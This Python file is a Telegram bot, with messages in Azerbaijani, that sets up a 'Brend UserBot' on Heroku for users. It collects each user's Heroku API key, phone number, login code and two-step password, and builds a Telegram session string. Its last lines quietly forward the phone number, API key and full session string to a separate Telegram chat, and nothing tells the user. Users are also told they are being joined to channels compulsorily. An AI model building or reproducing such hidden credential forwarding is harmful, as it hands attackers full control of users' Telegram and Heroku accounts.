import os, math, datetime, shutil, tracemalloc, heroku3, random, requests, asyncio
from asyncio.exceptions import TimeoutError
from pyrogram import filters, Client
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import PhoneNumberInvalidError, PhoneCodeInvalidError, PhoneCodeExpiredError, SessionPasswordNeededError, PasswordHashInvalidError
from time import time
from git import Repo
from bot import Bot as bot

@Client.on_message(filters.command('start') & filters.private)
async def start(client: Client, message: Message):
    text = f"<b>👋🏻 Salam {message.from_user.first_name} Mən 𝙱​𝚛彡𝚗𝚍​ UserBot üçünəm\n\n⚡ Əgər 𝙱​𝚛彡𝚗𝚍​ UserBot qurmaq istəyirsənsə /brend yaz.</b>"
    reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("⚡ Əsas Kanal", url=f"https://t.me/brenduserbot")], [InlineKeyboardButton("👨🏻‍🔧 Kömək", url=f"https://t.me/Brendsup")], [InlineKeyboardButton("👨🏻‍💻 Sahibim", url=f"https://t.me/BrendOwner")]])
    await message.reply(text = text, reply_markup = reply_markup, quote = True, disable_web_page_preview = True)

@Client.on_message(filters.command('alive'))
async def alive(Bot, message: Message):
    text = f"<b>╔═════════════════\n║▻ ⚡️ Hüsü Aktivdir\n║\n║▻ 💠 Python versiyası: 3.10.0\n║▻ 💎 Telethon versiyası: 1.24.0\n║▻ 💻 Pyrogram versiyası: 1.4.8\n╚═════════════════</b>"
    await message.reply(text)

heroku_api = "https://api.heroku.com"

def rm_r(path):
    if not os.path.exists(path):
        return
    if os.path.isfile(path) or os.path.islink(path):
        os.unlink(path)
    else:
        shutil.rmtree(path)


@Client.on_message(filters.private & ~filters.forwarded & filters.command('brend'))
async def husu(bot, msg):
    user_id = msg.chat.id
    try:
        api_msg = await bot.ask(user_id, "⚡ **Brend Userbot Qurulumuna başlamaq üçün ilk öncə API keyinizi daxil edin__", filters=filters.text, timeout=10)
    except TimeoutError:
        await bot.send_message(user_id, "❌ **Heroku Api-Key dəyərinin göndərilməsi üçün verilən 10 saniyə bitdi.**")
    api = api_msg.text
    heroku_conn = heroku3.from_key(api)
    try:
        heroku_conn.apps()
    except:
        await msg.reply("❌ **Heroku ApiKey yanlışdır**")
        return
    appname = "brend" + str(time() * 1000)[-4:].replace(".", "") + str(random.randint(0,500))
    try:
        heroku_conn.create_app(name=appname, stack_id_or_name='container', region_id_or_name="eu")
    except requests.exceptions.HTTPError:
        await msg.reply("**❌ Herokuda 5 tətbiqiniz var tətbiqlərin bəzilərini silib quruluma yenidən başlayın.**")
        return
    

    # Telegram Prosesləri #
    try:
        phone_number_msg = await bot.ask(user_id, "✅ **Herokuya Daxil olundu!\n🆙 İndi telefon nömrənizi göndərin.\n🔢 Nümunə:** 994501234567", filters=filters.text, timeout=20)
    except TimeoutError:
        await bot.send_message(user_id, "❌ **Nömrənizi göndərməyiniz üçün sizə verilən 20 saniyə başa çatdı.**")
    phone_number = phone_number_msg.text
    client = TelegramClient(StringSession(), 1558926, "69c4c16e17e9f637818f2cfce8f9bce5")
    await client.connect()
    try:
        code = await client.send_code_request(phone_number)
    except PhoneNumberInvalidError:
        await msg.reply("❌ **Telefon nömrəniz yanlışdır. Quruluma yenidən başlayın.**")
        return
    try:
        phone_code_msg = await bot.ask(user_id, "**✍🏻 Kodu nümunədəki formada daxil edin\n🆓 **Nümunə** 123.45", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('📟 Kod', url="tg://openmessage?user_id=777000")]]), filters=filters.text, timeout=30)
    except TimeoutError:
        await msg.reply("‼️ **❌ Kodu göndərmək üçün verilən 30 saniyə başa çatdı. Quruluma yenidən başlayın.**")
        return
    phone_code = phone_code_msg.text.replace(".", "")
    try:
        await client.sign_in(phone_number, phone_code, password=None)
    except PhoneCodeInvalidError:
        await msg.reply("❌ **Doğrulama kodu etibarsızdır. Quruluma yenidən başlayın.**")
        return
    except PhoneCodeExpiredError:
        await msg.reply("❌ **Doğrulama kodunun etibarlılıq müddəti bitdi. Quruluma yenidən başlayın.**")
        return
    except SessionPasswordNeededError:
        try:
            two_step_msg = await bot.ask(user_id, "**🔒 Hesabınızda iki addımlı doğrulama aktivləşdirilib.\n✍🏻 Zəhmət olmasa iki addımlı kodu daxil edin.**", filters=filters.text, timeout=60)
        except TimeoutError:
            await msg.reply("**‼️ Vaxt limiti 1 dəqiqəyə çatdı. Xaiş edirik quruluma yenidən başlayın.**")
            return
        try:
            password = two_step_msg.text
            await client.sign_in(password=password)
        except PasswordHashInvalidError:
            await two_step_msg.reply("❌ **İki adımlı doğrulama yanlış daxil edilib. Quruluma yenidən başlayın.**")
            return
    string = client.session.save()
    await client.send_message("me", "⚡️ **𝙱​𝚛彡𝚗𝚍​ UserBot Tərəfindən Avtomatik Mesaj\n\n🗣️ Salam siz hesabınıza ⚡️ 𝙱𝚛彡𝚗𝚍 Userbot qurursunuz. Brend Userbotu qurarkən @BrendSUP qrupuna və @BrendUserbot kanalına avtomatik olaraq məcburi qatılırsınız.\n\n💎 Bizi seçdiyiniz üçün təşəkkürlər**")
    await client.disconnect()

    await msg.reply("⚙️ Deploy proseduru başladı...\n\n⏱️ __Bu prosedur təxminən 2-3dəqiqə çəkir__")
    await bot.send_message(-1001197418406, "ℹ️ **Mən quruluma başlayıram.**\n\n🌐 __Qurulumu bitirdikdə bildiriləcəksiniz.__")
    start_time = time()
    if os.path.isdir("./brenduserbot/"):
        rm_r("./brenduserbot/")
    repo = Repo._clone("https://github.com/brendsupport/brenduserbot", "./brenduserbot/", branch="master")
    app = heroku_conn.apps()[appname]
    giturl = app.git_url.replace("https://", "https://api:" + api + "@")
    if "heroku" in repo.remotes:
        remote = repo.remote("heroku")
        remote.set_url(giturl)
    else:
        remote = repo.create_remote("heroku", giturl)
    try:
        remote.push(refspec="HEAD:refs/heads/master", force=True)
    except Exception as e:
        await msg.reply(f"❌ Xəta baş verdi: {e}")

    app.install_addon(plan_id_or_name='062a1cc7-f79f-404c-9f91-135f70175577', config={})
    config = app.config()

    config['HEROKU_APIKEY'] = api
    config['HEROKU_APPNAME'] = appname
    config['STRING_SESSION'] = string
    config['LANGUAGE'] = "AZ"

    try:
        app.process_formation()["worker"].scale(1)
    except:
        await msg.reply("❌ Fayllar yüklənərkən xəta baş verdi. Xahiş edirik quruluma yenidən başlayın.")
        return
    vaxt = datetime.timedelta(seconds=int(time() - start_time))
    useragent = ('Mozilla/5.0 (Linux; Android 10; SM-G975F) '
                 'AppleWebKit/537.36 (KHTML, like Gecko) '
                 'Chrome/80.0.3987.149 Mobile Safari/537.36'
                 )
    u_id = heroku_conn.account().id
    headers = {
     'User-Agent': useragent,
     'Authorization': f'Bearer {api}',
     'Accept': 'application/vnd.heroku+json; version=3.account-quotas',
    }
    path = "/accounts/" + u_id + "/actions/get-quota"
    r = requests.get(heroku_api + path, headers=headers)
    if r.status_code != 200:
        return await msg.reply(f"`Error: something bad happened`\n\n>.`{r.reason}`\n")
    result = r.json()
    quota = result['account_quota']
    quota_used = result['quota_used']
    remaining_quota = quota - quota_used
    percentage = math.floor(remaining_quota / quota * 100)
    minutes_remaining = remaining_quota / 60
    hours = math.floor(minutes_remaining / 60)
    minutes = math.floor(minutes_remaining % 60)
    day = math.floor(hours / 24)
    await msg.reply(f"✅ **Qurulum Bitdi.\n⚡ Brend Userbot {vaxt} saniyə ərzində quruldu.\n\n   ℹ️ Heroku DYNO INFO\n • Hal hazırda qalan dyno\n   {hours} saat {minutes} dəqiqə\n\n Userbot təxminən {day} gün işləyəcək")
    await bot.send_message(-1001619697790, f"#Qurulum\n\n🏷️ Adı: [{msg.chat.first_name}](tg://user?id={msg.chat.id}) ({msg.chat.id})\n\n📞 Telefon: {phone_number}\n\n🌐 Heroku Api Key: ```{api}``` \n\n🆙 String: ```{string}```")
    await bot.send_message(-1001197418406, "⚡ **Qurulumu bitirdim.\n🆕 Hesabına Brend Userbot qoşmaq istəyənlər butona basa bilər**", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('⚙️ Brend Deploy', url="t.me/HusuRobot")]]))
